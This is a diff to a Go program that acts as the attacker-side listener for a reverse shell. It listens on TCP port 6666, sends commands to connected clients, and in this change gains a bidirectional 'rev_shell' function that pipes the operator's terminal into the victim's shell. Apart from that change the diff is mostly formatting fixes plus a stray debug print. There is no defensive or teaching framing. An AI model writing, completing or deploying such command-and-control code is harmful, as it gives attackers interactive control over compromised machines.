@@ -2,8 +2,8 @@ package main
 
 import (
 	"bufio"
-  "io"
 	"fmt"
+	"io"
 	"net"
 	"os"
 )
@@ -16,10 +16,12 @@ func write_welcome() {
 }
 
 func rev_shell(conn net.Conn) {
-  defer conn.Close()
-  fmt.Println("[Info] Client connected:", conn.RemoteAddr())
-	fmt.Println("[Info] Waiting for commands to send to the client") 
-  io.Copy(os.Stdout,conn)
+	defer conn.Close()
+	fmt.Println("[Info] Client connected:", conn.RemoteAddr())
+	fmt.Println("[Info] Waiting for commands to send to the client")
+	go io.Copy(conn, os.Stdin)
+	fmt.Println("test")
+	io.Copy(os.Stdout, conn)
 }
 
 func handle_client(conn net.Conn) {
@@ -48,7 +50,7 @@ func handle_client(conn net.Conn) {
 			fmt.Println("[Err] Failed to send command to client:", err)
 			break
 		}
-			_, err = conn.Read(buffer)
+		_, err = conn.Read(buffer)
 		if err != nil {
 			fmt.Println("[Err] Failed to receive response from client:", err)
 			break
@@ -61,7 +63,6 @@ func handle_client(conn net.Conn) {
 }
 
 func start_server() {
-	fmt.Println("[Info] Trying to start server")
 	listener, err := net.Listen("tcp", ":6666")
 	fmt.Println("started server")
 	if err != nil {
